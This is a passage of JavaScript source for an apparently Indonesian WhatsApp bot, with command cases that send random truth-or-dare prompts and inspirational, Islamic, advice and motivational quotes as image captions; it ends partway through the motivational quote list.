					const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					Angga.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: mek })
					await limitAdd(sender)
					break
		case 'dare':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					tod = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					Angga.sendMessage(from, tod, image, { quoted: mek, caption: '*Dare*\n\n'+ der })
					await limitAdd(sender)
					break
		case 'quoteskehidupan':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					const quotes =['Jangan pernah mengabaikan apapun yang terjadi, suatu saat akan sadar dan menyesal, ingat tuhan akan selalu memberikan penyesalan terakhir ...','Aku percaya, suatu hari nanti, aku akan memiliki semua hal yang telah aku doa kan selama ini.','Balas dendam yang paling terbaik adalah mengubah dirimu menjadi yang lebih baik lagi.','Hidupku jauh dari kata mewah, kalau kalian lihat aku selalu senang, itu karena aku tau cara menikmati hidup.','Persahabatan bukan tentang orang yang baik didepanmu, tetapi tentang orang yang tetap baik di belakangmu.','Tidak semua bisa dimiliki. Jaga yang sudah termiliki. Tidak semua bisa diterima. Pertahankan yang sudah ada.','Mereka pikir hidupku enak, padahal aku hanya berusaha untuk tidak mengeluh.','Ibu, sebajingan apapun anakmu ini, Hatiku selalu ingin bisa Membahagiakanmu.','Tidak semua hari berjalan dengan baik tapi ada hal baik di setiap harinya.','Pikiran negatif tidak akan pernah memberi kamu kehidupan yang positif','Mereka pikir hidupku enak, padahal aku hanya berusaha untuk tidak mengeluh.','Saya percaya bahwa satu-satunya keberanian yang dibutuhkan oleh seseorang adalah keberanian untuk mengikuti impian Anda sendiri.','Arti hidup adalah menemukan hadiahmu. Tujuan hidup adalah untuk memberikannya.','Ada kalanya kita dicari ketika diperlukan, Dan dilupakan setelah dapat apa yang dia inginkan.','Aku suka tidur, Bukan karena aku pemalas Hanya saja mimpiku lebih indah dari kenyataan.','Jika kamu terlahir bukan dari keluarga kaya, Maka pastikanlah keluarga kaya berasal dari mu.','Saat kamu memberi orang lain, sesungguhnya pemberian itu adalah untukmu. Dan saat kamu mendoakan orang lain, sesungguhnya doa itu juga untukmu. Maka sibuklah membahagiakan orang lain, agar kemudian dunia akan sibuk membahagiakanmu.','Pernah salah pilih, Pernah salah jalan, Karena ego, Karena ceroboh, Tapi kalau bukan karena salah, Kita tidak akan pernah belajar.','Teruntuk hatiku semoga kamu sabar dan tabah bukan untuk hari ini, tapi untuk setiap hari.','Apapun yang kamu alami hari ini tetaplah terlihat baik-baik saja, are you oke?','Wajar kulitku hitam, Tanganku kasar, Penampilanku dekil, KARENA KEGIATANKU KERJA BUKAN MEMINTA.','Sibuklah mencintai hidupmu sampai kamu tidak punya waktu untuk membenci, menyesal, ataupun merasa takut.','AKU BAHAGIA KARENA BERSYUKUR, BUKAN BERSYUKUR KARENA BAHAGIA.','Hanya karena kamu bisa melakukan apa saja, bukan berarti kamu mampu melakukan segalanya.','Kegagalan adalah kesempatan untuk memulai lagi dengan cara yang lebih cerdas.','Dulu waktu masih kecil tidak sabar pengen jadi dewasa, tapi ketika udah besar, aku baru sadar bahwa jaman kecil lah yang paling bahagia.','Saya adalah saya, Saya bukan dia ataupun mereka Jika ingin bersama saya, Terimalah apa adanya.','Online ku sangatlah santai ada yang chat ya syukur, tidak ada yang chat ya tidur.','Kamu tidak begitu dalam mengenaliku, jadi tolong berhentilah sok tau tentang hidup ku.','Saya terlahir dari keluarga sederhana jadi maaf kalau penampilan saya apa adanya.','Dirimu sebenarnya adalah apa yang kamu lakukan di saat tiada orang yang melihatmu.','Ada dua pilihan hidup di pagi hari. Kembali tidur untuk melanjutkan mimpi, atau bangun tidur untuk mewujudkan mimpi.','Orang yang dibelakangku membicarakan diriku, keadaanku, keburukanku, mungkin ia membahayakan dalam duniaku tapi yang jelas ia bermanfaat untuk akhiratku, maka biarlah ia meneruskannya. *#Jangan lupa tersenyum untuk setiap harinya*','Lupakanlah masalahmu sejenak, dan berbahagialah kamu.','Mencintai memang tentang penerimaan. Tapi bukan untuk dibodohi.','Hidup adalah keseimbangan antara menggenggam dan melepaskan.','Jalanan yang sulit seringkali membawamu ke tujuan yang paling indah.','Kita tidak gagal. Kita hanya telah belajar dari 1000 cara yang salah.','Kalau kamu menginginkan sesuatu yang belum pernah kamu miliki, kamu harus melakukan sesuatu yang belum pernah kamu lakukan.','Jangan berhenti sebelum kamu bangga dengan dirimu sendiri.','Siapapun yang kamu cari.. Percayalah, dia juga sedang mencarimu.','Bahagia itu tujuan, kecewa itu jalan. Seseorang tidak akan sampai ke tujuan, tanpa melewati sebuah jalan.','Teruslah update status, setidaknya orang lain tau bahwa kamu masih hidup.','Bukan aku yang hebat. Tapi doa orang tua ku.','Kalau kamu sering disakiti orang itu artinya kamu orang baik. Ingat, cuma pohon berbuah yang dilempari batu.','Dalam hidup ini, Sadar itu penting loh, Jangan sabar mulu, CAPEK!','Kamu mempunyai banyak pilihan hidup untuk itu, Pilihlah hanya yang bisa benar-benar menjadikanmu lebih baik.','Aku kuat karena aku pernah lemah. Aku berani karena aku pernah merasa takut. Aku bijak karena aku pernah melakukan kesalahan.','Bukan berdoa untuk meminta hidup yang lebih mudah, Tapi berdoalah untuk bisa menjadi manusia yang lebih tangguh dalam menjalani hidup.','Selalu ada kisah yang kamu tidak tau di balik setiap orang. Selalu ada alasan mengapa mereka menjadi seperti itu. Pikiran hal ini sebelum kamu mencoba menghakimi orang lain.','Orang lain hanya melihat hasil akhir tanpa pernah tau bagaimana lelahnya berproses.','Kebahagiaan bukan milik mereka yang memiliki segalanya, Tetapi untuk mereka yang bisa menghargai apa yang mereka miliki.','Aku hanya ingin diperlakukan spesial lagi.','Terkadang, Hal yang menahan mu untuk bergerak maju hanyalah Pikiranmu sendiri.','Dua hal Menggambarkan dirimu : Kesabaranmu saat tak punya apa-apa Dan Sikapmu saat memiliki segalanya.','Kita hanya bersama bukan bersatu.','Saat kamu benar Semua orang lupa Saat kamu salah Semua orang ingat','Uang memang bukan segalanya tapi Tanpa uang kehidupan ini akan susah','Bila kamu Yakin , Tak perlu ada kata Mungkin','JaAnggah kuat untuk melepaskan, Dan sabar untuk apa yang layak kamu dapatkan.','Pembenci itu sangat pemilih, Mereka hanya membenci orang yang hidupnya lebih baik  daripada hidup mereka.','Pasangan adalah cerminan diri kita. Maka teruslah perbaiki diri menjadi lebih baik setiap harinya, Maka pasangan terbaikpun akan diberikan tuhan.','Persahabatan adalah berbagi suka duka dan menua bersama.','Tersenyumlah ketika melihat masa lalu yang kelam, Karena engkau telah berhasil melewatinya.','Ketika banyak permasalahan yang menghampiri dirimu janganlah meminta untuk lekas dihilangkan. Tapi mintalah agar kamu bisa kuat untuk menyelesaikan.','Kehidupanmu adalah buah dari tindakan yang kamu lakukan. Tidak ada yang bisa disalahkan selain dirimu.','Kehidupan bukanlah masalah yang harus diselesaikan namun kenyataan yang harus diambil pengalamannya.','Semoga di tahun baru, Buku baru, Penulisan yang baru dengan isi yang lebih menarik untuk diimbas kembali di penghujung cerita nanti.','Masa lalu memang menyimpan banyak kenangan, Namun itu bukan alasan untuk tidak terus melangkah ke depan.','Santailah, Nikmati saja hidup, Tersenyumlah lebih banyak, Tertawalah lebih banyak, Dan janganlah memikirkan banyak hal.','Setiap perbuatan yang membahagiakan sesama adalah suatu sikap yang mencerminkan pribadi yang mulia.','Jarang yang sadar kalau kegagalan juga merupakan kesempatan emas untuk menuju kesuksesan.','Lebih baik bekerja keras dalam kediamnya kesunyian, Biarkan nanti sukses mu yang berbicara.','Belajar dari kesalahan masa lalu merupakan salah satu langkah awal untuk maju.']
					const quo = quotes[Math.floor(Math.random() * quotes.length)]
					crot = await getBuffer(`https://i.ibb.co/Bj8tD93/IMG-20210126-WA0018.jpg`)
					Angga.sendMessage(from, crot, image, { quoted: mek, caption: '*Quotes Kehidupan*\n\n'+ quo })
					await limitAdd(sender)
					break
		case 'quotesislami':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					const islami =['Hal yang paling manis adalah ketika seseorang menyebutkan nama kamu di tahajjud mereka.','Ya Allah panggillah diriku dan orang tuaku ke baitullah dalam keadaan sehat walafiat.','Ya Allah semoga seseorang yang engkau jodohkan denganku adalah seseorang yang saat ini sedang aku perjuangkan.','Allah tidak pernah tidur. Semua pasti akan di balas kelak. Orang-orang jahat yang sekarang bisa tertawa karena banyak uang, berkuasa, tapi besok-besok mereka semua di balas seadil-adilnya.','Jangan putus asa, Allah tidak akan mengecewakan hambanya yang ingin memperbaiki diri.','Percayalah orang yang menasehatimu untuk sholat adalah dia yang paling mencintaimu.','Bukannya Allah tidak tahu sedihmu, Tapi Allah tahu kalau kamu itu kuat.','Bacalah Al-Quran, Ia akan menenangkan hatimu meskipun engkau tidak memahami artinya.','Saat kita sakit hati sama omongan orang, saat itu juga sebenarnya Allah ngajarin kita buat jaga omongan kita ke orang lain. Sederhana bukan?','Di dunia ini orang paling baik pun bisa dicela, dan bahkan orang paling jahat sekalipun bisa di bela.','Al-Quran adalah teman yang tidak akan mengecewakan kamu di dunia dan akhirat.','Cara Allah menjawab doa hambanya : Iyaa.. aku beri untukmu sekarang. Tunggu, aku ingin melihat dulu perjuanganmu. Tidak, aku punya yang lebih baik untukmu.','Dan Allah tidak akan mengadzab mereka selama mereka mau Memohon ampun kepada-Nya. [Al-Anfaal, 8:33]','Kesabaran itu ada dua macam : Sabar atas sesuatu yang tidak kamu ingin. Sabar menahan diri dari sesuatu yang kamu ingini. -Ali bin Abi Thalib','Ambillah kebenaran, jika kamu telah mendengarnya. Karena sungguh di atas kebenaran ada cahaya. (HR. Abu Daud)','Sholatlah agar hatimu tenang, Istighfarlah agar kecewamu hilang, Berdoalah agar bahagiamu segera datang.','Surga itu mahal.. Akan tetapi orang miskin tetap mampu membelinya, Karena harganya bukan pada Harta melainkan Taqwa.','Ya Allah... Perbaikilah lisanku, Perbaikilah hatiku, Perbaikilah akhlakku, Perbaikilah hidupku, Aamiin..','Semoga hari ini Allah memudahkan setiap urusan kita, melapangkan hati kita serta meringankan langkah kita, dalam kebaikan kita Aamiin.','Peganglah aku, bacalah aku setiap hari, karena aku akan menjadi penerang didalam kuburmu nanti. #Al-Quran','Kematian..Kamu terlalu banyak bercanda. Hingga sampai kamu lupa, kematian mungkin tidak menunggumu selesai tertawa.','Jangan khawatirkan rizkimu, karena Allah telah menjaminnya untukmu, namun khawatirkanlah amalanmu, karena Allah tidak menjamin surga-Nya untukmu..','Wahai orang-orang yang beriman! Ingatlah kepada Allah, Dengan mengingat (nama-Nya) sebanyak-banyaknya dan bertasbihlah kepada-nya pada waktu pagi dan petang.','Aku sangat ingin menjadi pemburu surga. Namun aku lupa bahwa aku juga buronan neraka.','Karena aku percaya apapun yang menjadi milikku akan tetap menjadi milikku. Sejauh apapun dia (mencoba) pergi. Sejauh apapun usaha orang lain ingin merebutnya dariku. Aku hanya perlu percaya pada Allah bahwa yang menjadi milikku tidak akan pernah menjadi milik orang lain.','Andai hidayah itu seperti buah yang bisa kubeli, maka akan kubeli berkeranjang-keranjang untuk aku bagikan kepada orang-orang yang aku cintai.','Bila kamu tidak melihatku di syurga. Tolong tanya kepada Allah dimana aku, Tolonglah aku ketika itu..','Hanya Allah yang mengerti bagaimana sulitnya menahan sabar tanpa harus bercerita panjang lebar.','Letakkan hpmu lalu ambil air wudhu, shalatlah kamu, Allah menunggu curhatan darimu.','Maafin aku Ya Allah Gara gara aku mencintai dia tapi tidak pasti, sampai aku lupa mencintai mu juga.','Akan ada saatnya setelah salam dari sholatku, tanganmu yang pertama kali kusentuh.','Mungkin maksud Tuhan mempertemukan kamu dengannya adalah, sekedar mengingatkan bahwa tidak semua yang kamu inginkan bisa kamu dapatkan.','Percayalah Seorang wanita yang mencintai Allah. Allah akan berikan lelaki terbaik untuk menjaganya.','Berterimakasihlah kepada tuhan, Yang memberimu hidup dan kehidupan.','Mungkin kamu hanya harus sedikit peka untuk menyadari petunjuk dari Tuhan atas doa-doamu.']
					const isl = islami[Math.floor(Math.random() * islami.length)]
					islam = await getBuffer(`https://i.ibb.co/dPnjvD3/IMG-20210127-WA0018.jpg`)
					Angga.sendMessage(from, islam, image, { quoted: mek, caption: '*Quotes Islami*\n\n'+ isl })
					await limitAdd(sender)
					break	
		case 'quotesnasehat':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					const nasehat =['Jangan pernah mengabaikan apapun yang terjadi, suatu saat akan sadar dan menyesal, ingat tuhan akan selalu memberikan penyesalan terakhir ...','Ingat iya.. Perilaku mu bisa mengubah perasaan seseorang.','Setia itu bukan yang selalu ada, namun saat tak bersama dia tahu hatinya milik siapa.','Kamu perlu belajar satu hal : "Menghargai seriusnya seseorang."','Jangan cari yang sempurna, Sempurnakan saja yang ada.','Ketika seseorang menghina kamu, itu adalah sebuah pujian bahwa selama ini mereka menghabiskan banyak waktu untuk memikirkan kamu, bahkan ketika kamu tidak memikirkan mereka.','Yang terbaik tidak akan hilang. Jika dia hilang maka dia bukanlah yang terbaik.','Percayalah. Suatu hari nanti pasti akan ada seseorang yang bangga memilikimu.','Tidak ada karya yang pernah dibuat oleh seorang seniman yang malas.','Jika seseorang memberimu perhatian jangan pernah mengabaikannya karena suatu saat perhatian sekecil itu kamu rindukan saat kamu kesepian.','Bersyukurlah.. Untuk segala apapun yang engkau miliki saat ini, sebab nikmat itu akan bertambah ketika kamu dapat mensyukuri apa yang telah diberi saat ini. #Buat diri ini jangan banyak mengeluh yah.','Ada perbedaan antara menyerah dan tau kapan kamu merasa cukup dalam berusaha.','Jangan sampai kesenanganmu menyusahkan orang lain. Jangan pula kesusahanmu menyenangkan orang lain.','Semakin banyak kamu memberi, semakin banyak pula yang akan kembali padamu.','Jangan pernah bandingkan akhir kesuksesan orang lain dengan pertengahan prosesmu.','Lakukan apa yang kamu bisa, dengan apa kamu miliki, dimanapun kamu berada.','Hidup memang bukan balapan, tetapi kamu memang perlu untuk terus bergerak maju.','NIKMATI HIDUPMU, LUPAKAN UMURMU.','Sebaik-baiknya permintaan maaf adalah membaiknya tingkah laku.','Belajarlah memahami bahwa tidak semua keinginan bisa terpenuhi, barangkali itu adalah obat yang terbaik untuk mencegah kecewa dan sakit hati.','Kamu akan menemukan yang terbaik, ketika kamu sudah berhenti membanding-bandingkan.','Jangan menilai orang dari masa lalunya karena kita semua sudah tidak hidup disana. Semua orang bisa berubah, biarkan mereka membuktikannya.','Jika dia tidak merasakan kehadiranmu, buat dia merasakan kepergianmu.','Orang pintar mampu memecahkan masalah. Orang bijak mampu menghindarinya.','Bersikap tidak lagi peduli lebih baik dari pada balas dendam.','Tegas akan diri sendiri, buang pikiran negatif dan lakukan yang baik. Kegelisahan hanya milik mereka yang putus asa.','Jangan pikirkan kegagalan kemarin, hari ini sudah lain, sukses pasti diraih selama semangat masih menyengat.','Memaafkanmu bukan berarti memberimu kesempatan sekali lagi.','Berubah menjadi lebih baik adalah pilihan. Tapi, merasa paling baik adalah kesalahan.','Jangan pernah bandingkan dirimu dengan orang lain, tapi bandingkanlah dengan dirimu yang lalu, apakah hari ini sudah lebih baik?','Ketahuilah orang yang paling sering memberi nasihat kepadamu, itulah orang yang paling mencintai kamu.','Jangan pernah berhenti belajar, karena hidup tidak pernah berhenti mengajarkan.','Salah satu tanda dirimu tidak berakhlak adalah main HP ketika ada orang yang berbicara.','Raihlah kesuksesan yang tidak seseorangpun berfikir kamu bisa meraihnya. Buktikan pada mereka kalau kamu bisa!','Kesalahan adalah bukti nyata kalau kamu pernah mencoba. Jangan takut salah. Takutlah untuk melakukan kesalahan-kesalahan yang sama dua kalinya.','Cepat atau lambat bukan masalah. Selama kamu tetap bergerak maju, tidak ada akhirnya kamu akan tetap sampai tidak ada tujuan.','Jika kamu tidak bisa membahagiakan orang lain, Setidaknya janganlah kamu tambah dukanya.','Teruslah berusaha sampai temanmu berkata kepadamu "Sombong iya sekarang."','Ketika kamu melakukan sebuah kesalahan, Akuilah dan jangan ragu untuk meminta maaf. Tidak pernah ada satupun orang dalam sejarah yang mati tersedak karena menelan gengsinya sendiri.','Syukuri yang menyayangimu, Maafkan yang menyakitimu.','Tunjukkan keburukanmu, lalu lihat siapa yang bertahan.','Kamu boleh lelah, tetapi tidak boleh menyerah untuk selamanya.','Jangan pernah lupa bilang "Terima Kasih." Jangan pernah gengsi bilang "Maaf." Jangan pernah jadi terlalu sombong untuk bilang "Tolong."','Masa lalu tidak bisa berubah, diubah, dilupakan, ataupun di hapus. Masa lalu hanya bisa di terima','Kita ini.. sangat pintar menghakimi, Namun bodoh dalam memperbaiki diri.','Tidak peduli seberapa baiknya kamu, Kebaikan tidak akan berarti apa-apa jika kamu memberikan kepada orang yang salah.','Orang sabar selalu menang, Orang tamak selalu rugi, Orang marah selalu kalah, Orang baik selalu diuji.','Carilah tempat dimana kamu bisa dihargai, Bukan dibutuhkan. Karena banyak orang mencarimu hanya saat butuh saja, Hingga lupa bagaimana cara menghargaimu.','Melupakan orang yang melukaimu adalah hadiahmu untuk mereka. Memaafkan orang yang melukaimu adalah hadiahmu untuk dirimu sendiri.','Maafkan orang yang menyakitimu... Bukan karena mereka pantas di maafkan, Tapi karena kamu harus berbahagia.','Tetaplah kuat, Tetaplah positif, Buatlah mereka bertanya-tanya bagaimana kamu masih tetap bisa tersenyum.','Jangan meninggalkan yang pasti demi yang mungkin. Sebab semua kemungkinan, belum tentu menjadi kepastian.','Seseorang pernah berkata padaku, Merelakan bukan berarti menyerah, Tapi tidak bisa dipaksakan.','Ikuti alurnya, Nikmati prosesnya, Tuhan tau kapan kita harus bahagia.','Usia hanyalah angka, Hanya mereka yang terus berusaha yang berhasil.','Jangan pernah meremehkan siapapun! Karena sukses adalah balas dendam Terbaik.','Pria sejati.. Harus menyelesaikan apa yang sudah dimulai.','Jika kau ingin terbang, Kau harus melepaskan hal-hal yang membuatmu berat.','Siapapun yang meremehkan mu hari ini, Suatu saat harus kamu lewati.','Jangan Mencintai terlalu mudah, Jangan Percaya terlalu cepat, Jangan Berhenti terlalu dini, Jangan Berharap terlalu tinggi, Jangan Bicara terlalu banyak.','JaAnggah orang baik tapi jangan biarkan orang lain mengambil keuntungan dari mu. Ketahuilah kapan kamu harus bilang tidak.','Sahabat sejati adalah mereka tau semua kelemahan mu, Tapi tidak menggunakan nya untuk menjatuhkan mu.','Ada tiga hal yang harus dimiliki dalam hidup yaitu : Perubahan, Pilihan dan Prinsip.','Orang bodoh mengira dirinya bijak. orang bijak tau dirinya bodoh.','Jatuh cintalah seperlunya.. Kemudian patah hatilah secukupnya. Karena semua ada porsinya, Karena semua ada masanya.','Kita tidak pernah tau jalan hidup seseorang.. Maka ada baiknya jika kita tidak menghakiminya atas keputusan dalam hidupnya.','Jangan pernah menyesal mengenal seseorang dalam hidupmu, Orang baik akan memberi mu Kebahagiaan, Orang jahat akan memberi mu Pengalaman, Bahkan seburuk-buruk manusia akan memberi mu Pelajaran.','Jangan menilai kedewasaan dari usia seseorang, Karena itu bukan jaminan.']
					const nsh = nasehat[Math.floor(Math.random() * nasehat.length)]
					nase = await getBuffer(`https://i.ibb.co/bspYPtC/IMG-20210125-WA0018.jpg`)
					Angga.sendMessage(from, nase, image, { quoted: mek, caption: '*Quotes Nasehat*\n\n'+ nsh })
					await limitAdd(sender)
					break	
		case 'quotescinta':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					const cinta =['SABAR MASIH TAHAP PEMBUATAN','MASIH TAHAP PEMBUATAN']
					const cin = cinta[Math.floor(Math.random() * cinta.length)]
					cta = await getBuffer(`https://i.ibb.co/vL5x6F7/IMG-20210126-WA0018.jpg`)
					Angga.sendMessage(from, cta, image, { quoted: mek, caption: '*Quotes Cinta*\n\n'+ cin })
					await limitAdd(sender)
					break
		case 'quotesmotivasi':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					const motiv =['Nilai sebuah tindakan terletak dalam usaha menyelesaikan sampai tuntas','Kebaikan adalah seorang yang matanya penuh perhatian, serta tangannya yang penuh manfaat','Hiduplah seperti kamu akan mati besok, dan berbahagialah seperti kamu akan hidup selamanya','Kita tidak usah saling menyalahkan, agar dimasa depan tak ada yang menuntut akan kesalahan','Ketika semua hal tidak sejalan dengan anda, ingatlah bahwa sebuah pesawat terbang melawan angin, bukan dengan mengikuti angin','Belajarlah menikmati apa yang kamu miliki, itu akan membuat hidupmu lebih bernilai','Selalu ada kegelapan yang tergelap sebelum terbitnya fajar','Sahabat itu seperti bintang, tak selalu Nampak tetapi selalu ada dihati','Sibuk bukanlah jaminan karir karena hasil jauh lebih didengar orang','semua kemajuan tidak akan ada tanpa kesalahan, kesalahan adalah bagian dari kemajuan selama diakui dan diperbaiki','Sukses meninggalkan jejak, gagal meninggalkan pelajaran, diam meninggalkan penyesalan','Keraguan bersahabat dekat dengan kegagalan','uang tidak merusak seseorang, keserakahan lah yang merusak manusia','Kepercayaan tidak bisa dibeli, tapi kepercayaan bisa dipelihara','Impian, target, kemauan dan tujuan semuanya sia-sia tanpa tindakan','usia bisa berbohong tapi kedewasaan tidak','Ada yang lebih berharga dari uang dan emas yaitu waktu','Tidak ada yang gagal mereka hanya berhenti terlalu cepat','Terasa sakit selalu hampir tidak ada rasanya setelah apa yang kita perjuangkan tercapai','Seseorang tidak bisa sukses seringkali karena kurangnya keberanian untuk mencobaterasa sakit selalu hampir tidak ada rasanya setelah apa yang kita perjuangkan tercapai','Bicaralah secukupnya, lakukanlah semampunya. Jangan melakukan sebaliknya','Ada saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','jangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','Kadang cara terbaik untuk Memanfaatkan peluang adalah dengan mengatakan tidak pada peluang baru dan fokus mengembangkan apa yang sudah ada di tanganjangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','atasan hanya memberikan tugas berat pada karyawan terbaik, Allah hanya memberikan ujian pada pada manusia terbaikKadang cara terbaik untuk Memanfaatkan peluang adalah dengan mengatakan tidak pada peluang baru dan fokus mengembangkan apa yang sudah ada di tanganjangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','berusaha dan gagal Ternyata jauh lebih melegakan daripada pasrah melihat ke kanan dengan tangan terlipat','lewat kesulitan lah manusia belajar, lewatnya kenyamanan lah manusia Terlena','Saat kita merasa hebat kita baru saja kehilangan separuh pangkat kita karena lengah untuk terus belajar','hidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Orang pintar itu biasa orang hebat itu luar biasa tapi orang berani lah pemenangnyahidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Orang hebat membicarakan ide, orang menengah membicarakan pengalaman, orang lemah membicarakan orang lainOrang pintar itu biasa orang hebat itu luar biasa tapi orang berani lah pemenangnyahidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Anda tidak akan mengubah kehidupan sampai anda mengubah Apa yang anda lakukan setiap hari','bertahan saja tidak cukup anda perlu bereaksi terhadap tekanan dan merubah keadaan','masa depan kita tergantung pada apa yang kita lakukan pada saat ini. Maka jangan sia-siakan waktumu sekarang','Nilai manusia ditentukan bukan dari apa yang diperoleh melainkan apa yang telah diberikan','Malas adalah kemenangan saat ini dan kekalahan di masa nanti','sebuah masalah merupakan kesempatan bagi anda untuk mengeluarkan kemampuan terbaik anda','Kematian tidak dapat mengubur perbuatan baik seseorang','Asal percaya dengan sungguh-sungguh apapun keyakinan Anda dapat menjadi kenyataan','Jika ada hari buruk maka pasti akan hari ada hari baik tugas kita adalah terus bergerak majuAsal percaya dengan sungguh-sungguh apapun keyakinan Anda dapat menjadi kenyataan','Mengeluh adalah cara paling buruk dalam menyelesaikan masalah','Tetap Bertahan dan setia pada tujuan saat menghadapi Hambatan adalah kunci kesuksesan','Tidak perlu keahlian khusus untuk mencari musuh, tapi perlu kesetiaan untuk mempertahankan teman','Orang tua bukan hanya punya kekuatan untuk menatap juga untuk mengalah','Keuletan adalah tanda jadi kesuksesan','cepat atau lambat mereka yang menang adalah mereka yang berfikir dan yakin bahwa mereka bisa','Jaga terus Api Harapan Anda seperti menjaga hidup anda sendiri','Saat semua jalan tertutup. Buatlah jalan dan berserahlah kepada Allah','lari dari masalah bukanlah penyelesaian masalah, hadapi dan Belajarlah dari masalah itu','Rezeki itu ditangan Allah yang kita lakukan hanya berusaha semaksimal mungkin dan menyerahkan hasilnya kepada yang kuasa','Sukses dimulai dengan melakukan apa yang harus Anggakukan','rasa syukur membuat kita tidak pernah merasa kekurangan','goal hanya sekedar goal kalau kita tidak mempunyai alasan yang kuat Mengapa kita harus mencapainya','Apapun yang terjadi Yakinlah bahwa Allah menginginkan kita akan jadi lebih baik karena Kejadian ini','orang yang paling Bahagia bukanlah orang yang punya hal-hal terbaik tapi orang yang bisa menjadikan hal-hal yang ia punya menjadi yang terbaikApapun yang terjadi Yakinlah bahwa Allah menginginkan kita akan jadi lebih baik karena Kejadian ini','Respon kita terhadap masalah menentukan kualitas berita fokus pada solusi','Semua yang terlalu sedikit dan terlalu banyak tidak akan membawa kebaikan','Tidak semua usaha kita dibayar oleh manusia, tapi Allah akan membayarnya kelak','Tidak ada harga untuk waktu, tetapi waktu sangat berharga','Sukses seringkali datang pada mereka yang berani bertindak dan jarang menghampiri pada mereka yang dikalahkan ketakutan','Katakan bisa pasti bisa dengan penuh keyakinan otak kita akan segera mencari solusi','Orang yang tidak belajar dari kegagalan adalah orang yang gagal sesungguhnya','Segala sesuatu masalah yang menimpa Anda tidak akan pernah melatih kekuatan anda untuk menyelesaikannya','Saat orang lain melakukan impianmu itu berarti mereka belum mampu melihat sejauh anda melihat','Allah tidak pernah terlambat ia akan menunjukkan kuasanya, pada detik terakhir sekalipun','Bukan banyaknya panah yang menentukan kemenangan tapi tajam panah dan tujuannya yang menentukan','Mengeluh itu sisi lain dari pemborosan, pemborosan waktu dan energy','Pikiran negatif sangat berkuasa bila diberi kesempatan, jadi jangan memberinya kesempatan','Cinta akan membuat kita menjadi orang terkaya di dunia, oleh karena itu mulailah mencintai','Cemas yang berlebihan tidak akan mengubah apapun kecuali merusak diri sendiri','Hidup ini sederhana terkadang pikiran manusia yang membuatnya rumit','Siapa yang bisa 